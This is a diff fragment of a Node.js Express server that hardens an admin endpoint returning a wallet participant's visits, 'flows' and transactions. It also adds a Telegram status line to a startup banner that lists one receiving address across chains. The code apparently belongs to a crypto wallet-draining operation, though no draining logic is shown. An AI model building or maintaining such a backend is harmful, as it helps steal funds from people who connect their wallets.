-  const flows = Array.from(memoryStorage.pendingFlows.values())
-    .filter(f => f.walletAddress === walletAddress);
+  const participant = Array.isArray(memoryStorage.participants) 
+    ? memoryStorage.participants.find(p => p && p.walletAddress === walletAddress)
+    : null;
+    
+  const visits = Array.isArray(memoryStorage.siteVisits)
+    ? memoryStorage.siteVisits.filter(v => v && v.walletAddress === walletAddress)
+    : [];
+    
+  const flows = memoryStorage.pendingFlows instanceof Map
+    ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
+    : [];
   
   if (!participant) {
     return res.json({ 
@@ -956,14 +1163,15 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     found: true,
     wallet: {
       ...participant,
-      connectedAt: participant.connectedAt?.toISOString(),
-      lastScanned: participant.lastScanned?.toISOString(),
-      claimedAt: participant.claimedAt?.toISOString()
+      connectedAt: participant.connectedAt instanceof Date ? participant.connectedAt.toISOString() : participant.connectedAt,
+      lastScanned: participant.lastScanned instanceof Date ? participant.lastScanned.toISOString() : participant.lastScanned,
+      claimedAt: participant.claimedAt instanceof Date ? participant.claimedAt.toISOString() : participant.claimedAt
     },
     visits,
     flows,
-    transactions: memoryStorage.settings.statistics.processedTransactions
-      .filter(t => t.wallet.toLowerCase() === walletAddress)
+    transactions: Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
+      ? memoryStorage.settings.statistics.processedTransactions.filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress)
+      : []
   });
 });
 
@@ -995,10 +1203,10 @@ app.listen(PORT, '0.0.0.0', async () => {
   ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   
+  🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
+  
   🚀 READY FOR MULTICHAIN FLOWS
   `);
   
   await testTelegramConnection();
 });
-
-
